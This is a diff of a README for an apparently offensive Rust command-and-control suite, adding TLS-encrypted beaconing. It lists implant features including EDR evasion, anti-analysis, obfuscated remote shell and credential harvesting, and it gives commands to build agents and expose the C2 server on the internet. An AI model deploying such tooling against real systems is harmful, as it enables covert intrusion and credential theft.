@@ -61,6 +61,7 @@ C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security suite 
 
 - ✅ **Lightweight Agent** - ~60KB binary with minimal dependencies
 - ✅ **Multi-Client Support** - Handle multiple agents simultaneously
+- ✅ **TLS Encrypted Communication** - All traffic encrypted with TLS 1.3
 - ✅ **Beacon Communication** - Configurable intervals with jitter for stealth
 - ✅ **Command Execution** - Remote shell with automatic obfuscation
 - ✅ **File Operations** - Bidirectional file transfer (upload/download)
@@ -75,6 +76,7 @@ C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security suite 
 - 🔒 **Direct Syscalls** - Bypass userland hooks (EDR evasion)
 - 🎭 **Command Obfuscation** - ArgFuscator-style obfuscation for all commands
 - 🔐 **Module Encryption** - AES-256-GCM encrypted capability modules
+- 🔐 **TLS 1.3** - Encrypted communications with auto-generated certificates
 - 🎯 **Anti-Analysis** - Comprehensive VM, sandbox, and debugger detection (production mode only)
 - 📊 **Structured Logging** - Comprehensive activity logging
 - 🎨 **Colored CLI** - Beautiful terminal interface with tables
@@ -114,7 +116,7 @@ For detailed command usage and examples, see the [Usage Guide](docs/USAGE.md).
 
 ## 🏗️ Architecture
 
-C2R2-v2 follows a modular client-server architecture:
+C2R2-v2 follows a modular client-server architecture with encrypted TLS communications:
 
 ```
 ┌─────────────────┐
@@ -122,7 +124,7 @@ C2R2-v2 follows a modular client-server architecture:
 │  (c2r2-server)  │
 └────────┬────────┘
          │
-         │ TCP Beacon (with jitter)
+         │ 🔐 TLS 1.3 Encrypted Beacon (with jitter)
          ▼
 ┌─────────────────┐
 │     Agent       │  ◄─── Target System (Windows)
@@ -138,8 +140,8 @@ C2R2-v2 follows a modular client-server architecture:
 ```
 
 **Components:**
-- **Agent** - Lightweight implant (60KB) with beacon communication
-- **C2 Server** - Async multi-client server with interactive CLI
+- **Agent** - Lightweight implant (60KB) with TLS-encrypted beacon communication
+- **C2 Server** - Async multi-client TLS server with interactive CLI
 - **Builder** - Tool for agent generation and module encryption
 - **Stealer** - Modular credential harvesting capability
 
@@ -196,6 +198,9 @@ cargo run --release -- build-agent --name agent-prod --server 192.168.1.10:4444 
 # 4. Build server
 cd ../c2r2-server
 cargo build --release
+
+# 5. Generate TLS certificates (first time only)
+./target/release/c2r2-server --generate-certs
 ```
 
 **📖 Build Modes:** See [BUILD.md](BUILD.md) for detailed documentation on development vs production builds.
@@ -210,6 +215,9 @@ cargo build --release
 #### Local Network (LAN)
 
 ```bash
+# Generate TLS certificates (first time only)
+./target/release/c2r2-server --generate-certs
+
 # Start C2 server (bind to all interfaces for network access)
 cd c2r2-server
 ./target/release/c2r2-server --bind 0.0.0.0 --port 4444
@@ -229,8 +237,9 @@ For deploying over the internet with port forwarding (e.g., Raspberry Pi):
 ```bash
 # 1. Configure router port forwarding: external 4444 → internal 4444
 # 2. Open firewall: sudo ufw allow 4444/tcp
-# 3. Start server: ./c2r2-server --bind 0.0.0.0 --port 4444
-# 4. Build agent with PUBLIC IP: --server "YOUR_PUBLIC_IP:4444"
+# 3. Generate TLS certs: ./c2r2-server --generate-certs
+# 4. Start server: ./c2r2-server --bind 0.0.0.0 --port 4444
+# 5. Build agent with PUBLIC IP: --server "YOUR_PUBLIC_IP:4444"
 ```
 
 **📖 Having connection issues?** See:
